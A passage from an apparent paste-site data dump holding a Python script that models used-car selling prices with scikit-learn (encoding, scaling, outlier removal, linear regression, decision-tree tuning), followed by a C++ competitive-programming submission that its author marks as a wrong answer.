from statsmodels.stats.outliers_influence import variance_inflation_factor
from sklearn.preprocessing import StandardScaler, RobustScaler, MinMaxScaler
from sklearn.feature_selection import RFE, f_regression
from sklearn.ensemble import RandomForestClassifier
from sklearn.pipeline import Pipeline
from sklearn.linear_model import LinearRegression, Ridge, Lasso
from sklearn.model_selection import GridSearchCV, KFold
from sklearn import utils
from mlxtend.feature_selection import SequentialFeatureSelector as SFS
from sklearn.model_selection import cross_val_score
from sklearn.feature_selection import SelectKBest
from sklearn.metrics import r2_score, mean_squared_error
from sklearn.tree import  DecisionTreeRegressor
from sklearn.ensemble import  RandomForestRegressor

# Display Pipeline

from sklearn import set_config

set_config(display='diagram')

df = pd.read_csv('CAR DETAILS FROM CAR DEKHO.csv')

# EDA and Preprocessing

# Displaying all columns
pd.set_option('display.max_columns', None)

# print(df.isnull().sum())
# print(df.dtypes)
# print(y.shape)
# print(df['transmission'].value_counts(), end='\n')
# print(df['fuel'].value_counts(), end='\n')
# print(df['seller_type'].value_counts(), end='\n')
# print(df['owner'].value_counts(), end='\n')
# print(df.duplicated(subset=None, keep='first'))

# print(df.shape)
# df.drop_duplicates(inplace=True)
# print(df.shape)

df.drop('name', axis=1, inplace=True)


df['years_old'] = 2020-df.year
df.drop('year', axis=1, inplace=True)

# Encoding Owner column-


trnf = ColumnTransformer(transformers=[
    # ('trnf1', OrdinalEncoder(categories=[['Electric', 'LPG', 'CNG', 'Petrol', 'Diesel']]), ['fuel']),
    ('trnf2', OrdinalEncoder( categories=[['Test Drive Car', 'Fourth & Above Owner', 'Third Owner', 'Second Owner', 'First Owner']]), ['owner']),
    # ('trnf3', OrdinalEncoder(categories=[['Individual', 'Dealer', 'Trustmark Dealer']]), ['seller_type']),
    ('trnf4', OneHotEncoder(sparse_output=False), ['transmission', 'seller_type', 'fuel'])
], remainder='passthrough')

df = pd.DataFrame(trnf.fit_transform(df), columns=trnf.get_feature_names_out())



# Feature Scalling

""""""
It introduces outliers thus, can't use it

""""""
# scaler = StandardScaler()
#
# df_scaled = pd.DataFrame(scaler.fit_transform(df), columns=scaler.get_feature_names_out())


##Comparing Scalling Effect
# fig, (ax1, ax2) = plt.subplots(ncols=2, figsize=(12, 5))
#
#
# ax1.set_title('Before Scaling')
# sns.kdeplot(df['remainder__years_old'], ax=ax1)
# sns.kdeplot(df['remainder__km_driven'], ax=ax1)
#
# ax2.set_title('After Standard Scaling')
# sns.kdeplot(df_scaled['remainder__years_old'], ax=ax2)
# sns.kdeplot(df_scaled['remainder__km_driven'], ax=ax2)
# plt.show()


# Feature Scalling

scaler = StandardScaler()

# df_scaled = df.copy()
# df_scaled = pd.DataFrame(scaler.fit_transform(df_scaled), columns=scaler.get_feature_names_out())
df = pd.DataFrame(scaler.fit_transform(df), columns=scaler.get_feature_names_out())

##Comparing Scalling Effect
# fig, (ax1, ax2) = plt.subplots(ncols=2, figsize=(12, 5))
#
#
# ax1.set_title('Before Scaling')
# sns.kdeplot(df['remainder__years_old'], ax=ax1)
# sns.kdeplot(df['remainder__km_driven'], ax=ax1)
#
# ax2.set_title('After Standard Scaling')
# sns.kdeplot(df_scaled['remainder__years_old'], ax=ax2)
# sns.kdeplot(df_scaled['remainder__km_driven'], ax=ax2)
# plt.show()




# Outlier Detection

##KDE Plot


# print(features)
# for col in features:
#     plt.figure(figsize=(16,5))
#     sns.distplot(df[col], kde=True)
#     plt.show()


##Using in-built function
# print(df[features].skew(), end='\n')


##Boxplot
# sns.boxplot(df)
# plt.xticks(rotation=45)
# df.boxplot()
# plt.show()




# Removing Outliers

features = df.columns

percentile_25 = df['remainder__selling_price'].quantile(0.25)
percentile_75 = df['remainder__selling_price'].quantile(0.75)
IQR = percentile_75 - percentile_25

max = percentile_75 + 1.5 * IQR
min = percentile_25 - 1.5 * IQR

df = df[(df['remainder__selling_price'] > min) & (df['remainder__selling_price'] < max)]
df.reset_index(drop=True, inplace=True)

percentile_25 = df['remainder__km_driven'].quantile(0.25)
percentile_75 = df['remainder__km_driven'].quantile(0.75)
IQR = percentile_75 - percentile_25

max = percentile_75 + 1.5 * IQR
min = percentile_25 - 1.5 * IQR

df = df[(df['remainder__km_driven'] > min) & (df['remainder__km_driven'] < max)]
df.reset_index(drop=True, inplace=True)

##Boxplot
# sns.boxplot(df)
# plt.xticks(rotation=45)
# df.boxplot()
# plt.show()



# Correlation Matrix


# sns.set(font_scale = 1)
# plt.figure(figsize=(3,3))
# cor = df.corr()
# sns.heatmap(cor, annot=True, cmap=""YlGnBu"", xticklabels=True, yticklabels=True, annot_kws={'fontsize': 8, 'fontweight': 'bold'})
# plt.show()



##VIF

vif_data = pd.DataFrame()
vif_data[""features""] = df.columns
vif_data[""VIF""] = [variance_inflation_factor(df.values, i)
                   for i in range(len(df.columns))]

# print(vif_data)

# df.drop(columns='trnf4__transmission_Manual', axis=1, inplace=True)



#Plotting

##Distplot

# features=df.columns
#
# for col in features:
#     plt.figure(figsize=(16,5))
#     sns.distplot(df[col], kde=True)
#     plt.show()


# ScatterPlot
# plt.scatter(X_train['remainder__km_driven'], y_train)
# plt.show()


target = 'remainder__selling_price'

X = df.loc[:, df.columns != target]

y = df[target]

X = np.array(X)
y = np.array(y)

X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)




#Feature Selection


#Model-linear Regession

pipe = Pipeline([
        ('kbest', SelectKBest(k=6, score_func=f_regression)),
        ('lr', LinearRegression())
    ])


grid = {
    'kbest__k': [int(i) for i in range(1, 7)],

}

# pipe_gs = GridSearchCV(pipe, grid, verbose=2, n_jobs=-1, cv=5)

# pipe_gs.fit(X_train, y_train)

# print('Best accuracy: ', pipe_gs.best_score_, end='\n')
# print('Params: ', pipe_gs.best_params_)


# Regression Metrics


pipe.fit(X_train, y_train)
y_pred = pipe.predict(X_test)

#R^2

pred_train = pipe.predict(X_train)
test = r2_score(y_test, y_pred)
train = r2_score(y_train, pred_train)
print(""R^2: "", ""Test: "", test, ""Train: "",train)


# MSE (Overfitting or underfitting)

pred_train = pipe.predict(X_train)
test = mean_squared_error(y_test, y_pred)
train = mean_squared_error(y_train, pred_train)
print(
    ""--------------------------------------------------Linear Regession------------------------------------------------------"")
print(""MSE: "", ""Test: "", test, ""Train: "", train, end=""\n"")
print()

# Validation

kfold_validation = KFold(10)
results = cross_val_score(pipe, X_train, y_train, cv=kfold_validation)
print(
    ""--------------------------------------------------Linear Regession------------------------------------------------------"")
print(""Results KFoldCrossValidation: "", results, end='\n')
acc = np.mean(results)
print()
print(""Accuracy KFoldCrossValidation: "", acc * 100, end='\n')
print(
    ""------------------------------------------------------------------------------------------------------------------------"")



# #Model Ridge Regression
#
# ridge = Ridge(alpha=1)
# ridge.fit(X_train, y_train)
#
# parameters = {""alpha"": [1e-15, 1e-10, 1e-5, 1, 10, 25, 30, 45, 55, 100]}
#
# # ridge_gs = GridSearchCV(ridge, parameters, cv=5, n_jobs=-1, verbose=2)
#
# # ridge_gs.fit(X_train, y_train)
#
# # print('Best accuracy: ', ridge_gs.best_score_, end='\n')
# # print('Params: ', ridge_gs.best_params_)
#
#
# #R^2
#
# y_pred_ridge = ridge.predict(X_test)
#
# pred_train_ridge = ridge.predict(X_train)
# test = r2_score(y_test, y_pred_ridge)
# train = r2_score(y_train, pred_train_ridge)
# print(""R^2: "", ""Test: "", test, ""Train: "",train)
#
#
# # MSE (Overfitting or underfitting)
#
#
# pred_train = ridge.predict(X_train)
# test = mean_squared_error(y_test, y_pred)
# train = mean_squared_error(y_train, pred_train)
# print(""--------------------------------------------------Ridge Regession------------------------------------------------------"")
# print(""MSE: "", ""Test: "", test, ""Train: "", train, end=""\n"")
# print()
#
# # Validation
#
# kfold_validation = KFold(10)
# results = cross_val_score(ridge, X_train, y_train, cv=kfold_validation)
# print(""--------------------------------------------------Ridge Regession------------------------------------------------------"")
# print(""Results KFoldCrossValidation: "", results, end='\n')
# acc = np.mean(results)
# print()
# print(""Accuracy KFoldCrossValidation: "", acc * 100, end='\n')
# print(
#     ""------------------------------------------------------------------------------------------------------------------------"")

dt = DecisionTreeRegressor()
# dt.fit(X_train, y_train)


#Pruning RegressionTrees


path = dt.cost_complexity_pruning_path(X_train, y_train)

ccp_alpha, impurities = path.ccp_alphas, path.impurities



# Hyper Parameter Tuning (GridSearch)

parameters = {""criterion"": [""squared_error"", ""absolute_error""],
              ""splitter"": [""best""],
              ""max_depth"": [None, 1, 2, 3, 4, 5],
              ""max_features"": [""auto"", ""sqrt"", 0.25, 0.5, 0.75, 1.0],
              ""ccp_alpha"": ccp_alpha,
              ""max_leaf_nodes"": [None, 2, 3, 4, 5, 6],
              ""min_samples_split"": [0.25, 0.5, 0.75, 1.0],
              ""min_samples_leaf"": [int (x) for x in range(1, 20, 1)]
            }

# dt_gs = GridSearchCV(dt, parameters, cv=5, n_jobs=-1, verbose=2)
# dt_gs.fit(X_train, y_train)
#
# print('Best accuracy: ', dt_gs.best_score_, end='\n')
# print('Params: ', dt_gs.best_params_)



# #R^2
#
# y_pred_dt = dt.predict(X_test)
# pred_train_dt = dt.predict(X_train)
#
# pred_train_ridge = dt.predict(X_train)
# test = r2_score(y_test, y_pred_dt)
# train = r2_score(y_train, pred_train_dt)
# print(""R^2: "", ""Test: "", test, ""Train: "",train)
#
#
#
# # MSE (Overfitting or underfitting)
#
#
#
# test = mean_squared_error(y_test, y_pred_dt)
# train = mean_squared_error(y_train, pred_train_dt)
# print(
#     ""--------------------------------------------------DecisionTree Regession------------------------------------------------------"")
# print(""MSE: "", ""Test: "", test, ""Train: "", train, end=""\n"")
# print()
#
# # Validation
#
# kfold_validation = KFold(10)
# results = cross_val_score(dt, X_train, y_train, cv=kfold_validation)
# print(
#     ""--------------------------------------------------DecisionTree Regession------------------------------------------------------"")
# print(""Results KFoldCrossValidation: "", results, end='\n')
# acc = np.mean(results)
# print()
# print(""Accuracy KFoldCrossValidation: "", acc * 100, end='\n')
# print(
#     ""------------------------------------------------------------------------------------------------------------------------"")
#



# Prection on Test Data


# for i in range(len(y_pred)):
#     print(""Actual: "", y_test[i])
#     print(""Prediction: "", y_pred_dt[i], end='\n')

# sns.regplot(x=y_pred, y=y_test)
# plt.xlabel(""Predicted Price"")
# plt.ylabel('Actual Price')
# plt.title(""Actual vs predicted price"")
# plt.show()





"
iJT8e8wv,CF1846E2 WA,pb_jiang,C++,Saturday 8th of July 2023 01:45:19 PM CDT,"#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using pii = pair<int, int>;
using pll = pair<ll, ll>;
using vl = vector<ll>;
using vi = vector<int>;
using ull = unsigned long long;
using ld = long double;

// constexpr ll p1 = (1ll << 50) - 51, p2 = (1ll << 50) - 117;
constexpr ll p1 = (1ll << 30) - 35, p2 = (1ll << 30) - 41;

ll fpow(ll b, ll p, ll m)
{
    ll ret = 1;
    ll cur = b;
    while (p) {
        if (p % 2)
            ret = ret * cur % m;
        cur = cur * cur % m;
        p /= 2;
    }
    return ret;
}

int main(int argc, char **argv)
{
    ll t, n;
    cin >> t;
    while (t--) {
        cin >> n;
        bool ok = false;
        for (ll p = 3; p <= 95 && !ok; ++p) {
            ll lb = 2, ub = 1e9;
            // auto f = [p](ll k) { return (pow(double(k), double(p)) - 1) / (double) (k - 1); };
            auto f = [p](ll k) { return (powl(k, p) - 1) / (k - 1); };
            while (lb + 1 < ub) {
                ll mid = (lb + ub) / 2;
                if (f(mid) <= n)
                    lb = mid;
                else
                    ub = mid;
            }
            if (f(lb) == n)
                ok = true;
        }
        if (!ok) {
            auto f = [](ll k) { return 1 + k + k * k; };
            ll lb = 2, ub = 1e9;
            while (lb + 1 < ub) {
                ll mid = (lb + ub) / 2;
                if (f(mid) <= n)
                    lb = mid;
                else
                    ub = mid;
            }
            if (f(lb) == n)
                ok = true;
        }
        if (!ok) {
            auto f = [](ld k) { return 1 + k + k * k + k * k * k; };
            ll lb = 2, ub = 1e9;
            while (lb + 1 < ub) {
                ll mid = (lb + ub) / 2;
                if (f(mid) <= n)
                    lb = mid;
                else
                    ub = mid;
            }
            if (f(lb) == ld(n))
                ok = true;
        }
        cout << (ok ? ""YES"" : ""NO"") << endl;
    }
    return 0;
};"
